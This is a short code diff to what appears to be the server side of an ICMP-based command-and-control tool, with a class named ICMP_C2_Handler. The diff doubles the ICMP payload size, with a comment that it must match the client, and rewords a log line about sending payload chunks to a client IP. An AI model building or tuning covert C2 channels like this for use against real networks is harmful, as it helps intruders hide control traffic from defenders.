@@ -9,7 +9,7 @@ ICMP_TAG = "RQ47"
 PAYLOAD_MAX_SIZE = 512 * 1024
 BUFFER_MAX_SIZE = 1024 * 1024
 MAX_ICMP_CHUNK_SIZE = 1400
-ICMP_PAYLOAD_SIZE = 500
+ICMP_PAYLOAD_SIZE = 1000 # MUST MATCH CLIENT VALUE
 
 
 class ICMP_C2_Handler:
@@ -348,7 +348,7 @@ class ICMP_C2_Handler:
 
         while offset < total_size:
             chunk = full_payload[offset : offset + chunk_data_size]
-            print(f"    → Sending data chunk seq={seq}, bytes={len(chunk)}")
+            print(f"    → Sending data chunk seq={seq}, data_bytes={len(chunk)}")
             self.send_icmp_packet(ip_dst=client_ip,
                                   icmp_id=client_icmp_id,
                                   icmp_seq=seq,
